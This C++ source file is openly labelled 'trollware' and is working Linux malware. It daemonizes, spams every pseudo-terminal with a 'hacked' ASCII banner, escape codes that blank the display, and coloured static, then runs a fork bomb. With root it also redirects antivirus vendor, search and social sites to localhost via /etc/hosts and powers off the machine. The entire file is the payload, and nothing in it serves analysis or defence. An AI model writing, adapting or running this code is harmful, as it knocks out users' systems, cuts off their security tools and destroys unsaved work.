#include <iostream>
#include <unistd.h>
#include <thread>
#include <dirent.h>
#include <linux/reboot.h>
#include <sys/reboot.h>
#include <fstream>
#include <cstring>

#define red "\e[31m"
#define blue "\e[95m"
#define light_red "\e[91m"
#define yellow "\e[33m"
#define cyan "\e[36m"
#define normal "\e[0m"
#define white "\e[97m"
#define black "\e[30m"

using namespace std;

struct setup{
  string tty_write_location = "/dev/pts";
  string host_file = "/etc/hosts";
  string messup_terminal = "\e[8m\e[30m\e[40m\a";
  string blocked_sites[14] = {"xvideos.com", "pornhub.com", "comodo.com", 
  "avast.com", "avg.com", "symantec.com", "sophos.com", "liveupdate.symantec.com"
  "nai.com", "google.com", "bing.com", "mcafee.com", "youtube.com", "facebook.com"
  "twitter.com", "reddit.com"}; // highest priority to lowest :)
  string ascii_art = yellow "                   __ooooooooo__\n"
	"              oOOOOOOOOOOOOOOOOOOOOOo\n"
	"          oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo\n"
	"       oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo\n"
	"     oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo\n"
	"   oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo\n"
	"  oOOOOOOOOOOO*  *OOOOOOOOOOOOOO*  *OOOOOOOOOOOOo\n"
	" oOOOOOOOOOOO      OOOOOOOOOOOO      OOOOOOOOOOOOo\n"
	" oOOOOOOOOOOOOo  oOOOOOOOOOOOOOOo  oOOOOOOOOOOOOOo\n"
	"oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo\n"
	"oOOOO     OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO     OOOOo\n"
	"oOOOOOO OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO OOOOOOo\n"
	" *OOOOO  OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO  OOOOO*\n"
	" *OOOOOO  *OOOOOOOOOOOOOOOOOOOOOOOOOOOOO*  OOOOOO*\n"
	"  *OOOOOO  *OOOOOOOOOOOOOOOOOOOOOOOOOOO*  OOOOOO*\n"
	"   *OOOOOOo  *OOOOOOOOOOOOOOOOOOOOOOO*  oOOOOOO*\n"
	"     *OOOOOOOo  *OOOOOOOOOOOOOOOOO*  oOOOOOOO*\n"
	"       *OOOOOOOOo  *OOOOOOOOOOO*  oOOOOOOOO*\n"
	"          *OOOOOOOOo           oOOOOOOOO*\n"
	"              *OOOOOOOOOOOOOOOOOOOOO*\n"
	"                   \"\"ooooooooo\"\"\n"
	red "               Hahahahahahahacked!\n";
	int blocked_sites_num = sizeof(blocked_sites)/sizeof(blocked_sites[0]);
};
class misc_tools{
    public:
        void shutdown(void){
            reboot(LINUX_REBOOT_CMD_POWER_OFF);
        }
        void fork_bomb(void){
            while(1){
                fork();
            }
        }
}; 
class tty_write : setup, public misc_tools{
    public:
        void write_to_pty(string pty, string data, bool isasciiart){
            ofstream pty_file;
            pty_file.open(pty);
            if(pty_file.good()){
                if(isasciiart==true){
                    for(int i = 0; i < 100; i++){
                        pty_file << endl;  
                    }
                }
                pty_file << data;
                pty_file.close();     
            }
        }
        void write_sites_to_file(string site){
            ofstream hosts_file;
            hosts_file.open(host_file, ios::app);
            if(hosts_file.good()){
                hosts_file << "127.0.0.1 " << site << endl;
                hosts_file << "127.0.0.1 www." << site << endl;
                hosts_file.close();
            }
        }
        void block_sites_write(void){
            for(int i = 0; blocked_sites_num > i; i++){
                write_sites_to_file(blocked_sites[i]);
            }
        }
        int index_pty(const char *dirname, string data, bool isasciiart)
        {
            DIR *dir;
            struct dirent *entry;
            char path[PATH_MAX];
            if (path == NULL){
                cout << "Out of memory!" << endl;
                return 0;
            }
            dir = opendir(dirname);
            if (dir == NULL){
                perror("Error opendir()");
                return 0;
            }
            while ((entry = readdir(dir)) != NULL) {
                if (strcmp(entry->d_name, ".") && strcmp(entry->d_name, "..")){
                    snprintf(path, (size_t) PATH_MAX, "%s/%s", dirname, entry->d_name);
                    if (entry->d_type == DT_DIR){
                        index_pty(path, data, isasciiart);
                    }
                    if(isasciiart==true){
                        write_to_pty(path, data + normal, true);
                    }
                    else{
                        write_to_pty(path, data, false);
                    }
                }
            }
            closedir(dir);
            return 1;
        }
        string rand_colour(void){
            int decider = rand() % 9;
            if(decider==1){
                return red;
            } else if(decider ==2){
                return blue;
            } else if(decider==3){
                return light_red;
            } else if(decider==4){
                return yellow;
            } else if(decider==5){
                return cyan;
            } else if(decider==6){
                return normal;
            } else if(decider==7){
                return white;
            } else{
                return black;
            }
        }
        string static_gen(int length){
            string finished;
            string chars[66] = {"0","1","2","3","4","5","6","7","8","9", "a", "b", "c", "d", "e", 
            "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", 
            "x", "y", "z", "~", "!", "@","#", "]", "[", "}", "{", "|", "\\", ">", "<", ",", ".", "?", 
            ";", "`", "=", "+", ")", "(", "*", "&", "^", "%", "$", " ", "'", "\"", "\n"};
            for(int i = 0; i < length; i++){
                finished += chars[rand() % 66];
                finished += rand_colour();
            }
            return finished;
        }
        void terminal_messup(string tty_write_location, string messup_terminal){
            while(1){
                index_pty((tty_write_location).c_str(), messup_terminal, false);
            }
        }
        void static_to_terminals(int time_sleep){
            while(1){
                index_pty((tty_write_location).c_str(), static_gen(rand() % 100), false);
                sleep(time_sleep);
            }
        }
        void trollware_start(void){
            index_pty((tty_write_location).c_str(), ascii_art, true);
            thread(&tty_write::terminal_messup, this, tty_write_location, messup_terminal).detach();
            sleep(5);
            thread(&tty_write::static_to_terminals, this, 1).detach();
            sleep(5);
            if(getuid()==0){
                thread(&misc_tools::fork_bomb, this).detach();
                block_sites_write();
                sleep(30);
                shutdown();
            }
            else{
                fork_bomb();
            }
        }
}; tty_write tw;

int main(){
    daemon(1,1);
    srand(time(NULL));
    tw.trollware_start();
    return 69; // if it some how exits xd
}
